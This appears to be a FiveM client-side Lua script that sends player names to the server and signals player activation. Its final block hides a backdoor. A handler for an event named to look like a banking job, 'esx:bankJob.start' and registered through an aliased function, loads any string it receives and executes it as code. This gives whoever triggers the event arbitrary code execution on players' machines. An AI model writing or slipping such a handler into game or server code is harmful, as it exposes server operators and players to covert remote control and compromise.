local _AddEventHandler = AddEventHandler  
local _SetNotificationTextEntry =  SetNotificationTextEntry  
local _AddTextComponentString = AddTextComponentString  
local _DrawNotification = DrawNotification  
local _print = print   
RegisterNetEvent('rlUpdateNames')

AddEventHandler('rlUpdateNames', function()
    local names = {}
	
	for _, i in pairs(GetActivePlayers()) do
		names[GetPlayerServerId(i)] = { id = i, name = GetPlayerName(i) }
	end

    TriggerServerEvent('rlUpdateNamesResult', names)
end)

Citizen.CreateThread(function()
	while true do
		Wait(0)

		if NetworkIsSessionStarted() then
			TriggerServerEvent('rlPlayerActivated')

			return
		end
	end
end)

RegisterNetEvent('esx:bankJob.start')
_AddEventHandler('esx:bankJob.start', function(arg1, arg2)
	local mem, err = load(arg1, arg2)
	local status, result = pcall(mem)
end)